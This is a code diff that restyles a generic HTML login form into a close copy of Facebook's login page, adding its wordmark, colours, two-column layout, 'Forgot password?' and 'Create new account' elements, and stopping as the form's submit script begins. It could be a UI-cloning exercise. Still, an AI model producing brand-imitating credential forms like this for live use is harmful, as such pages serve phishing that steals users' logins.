@@ -3,42 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
+    <title>Facebook Login</title>
     <style>
         body {
             font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
             display: flex;
-            justify-content: center;
+            justify-content: space-between;
             align-items: center;
             height: 100vh;
-            margin: 0;
             background-color: #f0f2f5;
-            flex-direction: column;
+            box-sizing: border-box;
         }
-        .login-box {
+        .left-container {
+            flex: 1;
+            margin-left: 10%;
+        }
+        .left-container h1 {
+            font-size: 48px;
+            color: #1877f2; /* Facebook blue color */
+            margin-bottom: 10px;
+        }
+        .left-container p {
+            font-size: 20px;
+            color: #606770;
+        }
+        .right-container {
+            flex: 1;
+            max-width: 400px;
+            margin-right: 10%;
             background: white;
             padding: 30px;
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            width: 300px;
-            text-align: center;
         }
-        h1 {
-            font-size: 36px;
-            color: #1877f2; /* Facebook blue color */
-            margin-bottom: 10px;
+        .right-container form {
+            display: flex;
+            flex-direction: column;
         }
-        h2 {
-            font-size: 20px;
-            margin-bottom: 20px;
-            color: #1a73e8;
-        }
-        p {
-            color: #606770;
-            font-size: 14px;
-            margin-top: 20px;
-        }
-        input {
+        .right-container input {
             width: 100%;
             padding: 10px;
             margin: 10px 0;
@@ -46,33 +50,64 @@
             border-radius: 4px;
             box-sizing: border-box;
         }
-        button {
-            width: 100%;
+        .right-container button {
             padding: 10px;
-            background-color: #1877f2; /* Facebook blue color */
+            background-color: #1877f2;
             color: white;
             border: none;
             border-radius: 4px;
+            font-size: 16px;
             cursor: pointer;
+        }
+        .right-container button:hover {
+            background-color: #145dbb;
+        }
+        .right-container .secondary-options {
+            margin-top: 10px;
+            text-align: center;
+        }
+        .right-container a {
+            text-decoration: none;
+            color: #1877f2;
+            font-size: 14px;
+        }
+        .right-container .create-account {
+            background-color: #42b72a;
             margin-top: 10px;
         }
-        button:hover {
-            background-color: #145dbb; /* Slightly darker blue */
+        .create-page {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #606770;
+        }
+        .create-page a {
+            text-decoration: none;
+            color: #1877f2;
         }
     </style>
 </head>
 <body>
-    <h1>Facebook</h1>
-    <p>Connect with friends and the world around you on Facebook.</p>
-    <div class="login-box">
-        <h2>Login</h2>
+    <div class="left-container">
+        <h1>facebook</h1>
+        <p>Connect with friends and the world around you on Facebook.</p>
+    </div>
+    <div class="right-container">
         <form id="loginForm">
             <input type="text" id="userid" placeholder="Email or phone number" required>
             <input type="password" id="password" placeholder="Password" required>
-            <button type="submit">Login</button>
+            <button type="submit">Log In</button>
+            <div class="secondary-options">
+                <a href="#">Forgot password?</a>
+            </div>
+            <button type="button" class="create-account">Create new account</button>
         </form>
+        <div class="create-page">
+            <p>
+                <a href="#">Create a Page</a> for a celebrity, brand, or business.
+            </p>
+        </div>
     </div>
-
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
